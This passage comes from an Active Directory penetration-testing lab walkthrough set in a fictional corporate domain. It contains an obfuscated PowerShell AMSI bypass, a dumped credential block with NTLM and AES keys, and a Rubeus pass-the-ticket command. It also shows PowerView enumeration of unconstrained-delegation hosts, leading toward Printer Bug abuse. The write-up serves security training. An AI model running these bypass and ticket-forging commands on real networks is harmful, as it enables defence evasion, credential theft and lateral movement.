unconstrained delegation enabled can use it to launch a Golden Ticket attack, gaining access to any service or resource in the domain.</li></ol></div><div style="display:contents" dir="auto">
+<h1>Enumeration</h1></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8084-9f58-ed58b2890388" class="">The steps reproduced here will also include AV bypassing, but if no AV is being used in the environment then you can skip that and go forward to the enumeration.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8046-a8a4-f0e56dae1b9a" class="">Start by running InvisiShell then we can bypass AMSI.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-802a-b1de-de3956d9ef2a" class=""><code>RunWithRegistryNonAdmin.bat</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80be-9c3a-ece2c30b4f47" class="image"><a href="images/screenshot_156.png"><img style="width:1440px" src="images/screenshot_156.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801d-850c-f4d7dcc51074" class="">AMSI Bypass.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8065-bdab-fe032e03ab33" class="code code-wrap"><code class="language-bash">S`eT-It`em ( &#x27;V&#x27;+&#x27;aR&#x27; + &#x27;IA&#x27; + (&#x27;blE:1&#x27;+&#x27;q2&#x27;) + (&#x27;uZ&#x27;+&#x27;x&#x27;) ) ([TYpE]( &quot;{1}{0}&quot;-F&#x27;F&#x27;,&#x27;rE&#x27; ) ) ; ( Get-varI`A`BLE ((&#x27;1Q&#x27;+&#x27;2U&#x27;) +&#x27;zX&#x27; ) -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#x27;Uti&#x27;+&#x27;l&#x27;),&#x27;A&#x27;,(&#x27;Am&#x27;+&#x27;si&#x27;),(&#x27;.Man&#x27;+&#x27;age&#x27;+&#x27;men&#x27;+&#x27;t.&#x27;),(&#x27;u&#x27;+&#x27;to&#x27;+&#x27;mation.&#x27;),&#x27;s&#x27;,(&#x27;Syst&#x27;+&#x27;em&#x27;) ) ).&quot;g`etf`iElD&quot;( ( &quot;{0}{2}{1}&quot; -f(&#x27;a&#x27;+&#x27;msi&#x27;),&#x27;d&#x27;,(&#x27;I&#x27;+&#x27;nitF&#x27;+&#x27;aile&#x27;) ),( &quot;{2}{4}{0}{1}{3}&quot; -f(&#x27;S&#x27;+&#x27;tat&#x27;),&#x27;i&#x27;,(&#x27;Non&#x27;+&#x27;Publ&#x27;+&#x27;i&#x27;),&#x27;c&#x27;,&#x27;c,&#x27; )).&quot;sE`T`VaLUE&quot;(${n`ULl},${t`RuE} )</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8079-a70a-f5f4be8da47e" class="">We can use PowerView.ps1 to enumerate machines with Unconstrained Delegation enabled in the domain.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801c-b9e5-ea0f38d9440d" class=""><code>. .\PowerView.ps1</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8036-8ea4-fc86368a00b7" class=""><code>Get-DomainComputer -Unconstrained | select -ExpandProperty name</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-801e-ac5f-f46a15226e3c" class="image"><a href="images/screenshot_160.png"><img style="width:1488px" src="images/screenshot_160.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8060-9f3f-f59d7cb2bbd7" class="">We can see above that we do have 2 machines in the domain with Unconstrained Delegation enabled.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8069-a3ab-c5ee2edafa30" class="">Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let’s check if anyone of them have local admin privileges on dcorp-appsrv.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ba-ba03-f8b858ffa8a6" class="">Assuming that we do have <strong>appadmin </strong>account secrets already.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8045-8987-ff4ab1591844" class="code code-wrap"><code class="language-bash">** SAM ACCOUNT **
+
+SAM Username         : appadmin
+User Principal Name  : appadmin
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 11/14/2022 5:51:10 AM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-1117
+Object Relative ID   : 1117
+
+Credentials:
+  Hash NTLM: d549831a955fee51a43c83efb3928fa7
+    ntlm- 0: d549831a955fee51a43c83efb3928fa7
+    lm  - 0: 73bd1687627327ed924ea946a148c2af
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6c8d3770ffbdd9d632b5861bf2a6510f
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALappadmin
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
+      aes128_hmac       (4096) : 449e9900eb0d6ccee8dd9ef66965797e
+      des_cbc_md5       (4096) : 5ed64fa83dfd23b0
+
+* Primary:Kerberos *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALappadmin
+    Credentials
+      des_cbc_md5       : 5ed64fa83dfd23b0</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8044-bfa7-f1375791f4fd" class="">Let’s now use Rubeus to get a session as appadmin user account and start enumerating if appadmin account is local admin in any machine in the domain.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80eb-86e9-c04b5d2eafec" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows32\cmd.exe /show /ptt</code></p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80bf-b25c-d13bbe042b15" class="">now that we where able to get the session let’s just check the cached ticket to confirm that we do have the valid session.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b7-83a0-d01b148838f9" class=""><code>klist</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8062-ab4f-e0192ec7ccbd" class="image"><a href="images/screenshot_161.png"><img style="width:1440px" src="images/screenshot_161.png"/></a></figure></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a3-8046-f603e841085d" class="">Ok now that we do have a session as <strong>appadmin </strong>user, let’s see if we do have local admin rights to what machines in the domain.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c2-a01b-e4322a3ee9e6" class=""><code>. .\Find-PSRemotingLocalAdminAccess.ps1<br/>Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8049-9e3c-da9decb19e4e" class="image"><a href="images/screenshot_162.png"><img style="width:1440px" src="images/screenshot_162.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8028-bb82-cac327afa89e" class="">The screenshot above, shows us that user appadmin user account has local admin access to <strong>dcorp-appsrv </strong>machine, that’s great, we will use this user.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8014-91ef-ca6df2905b9b" class="">We can use multiple methods now to copy Rubeus to dcorp-appsrv to abuse Printer Bug!</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto">
+        </section>
+      </article>
+    </div>
+
+    <script src="../assets/js/script.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg2.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  </body>
+</html>
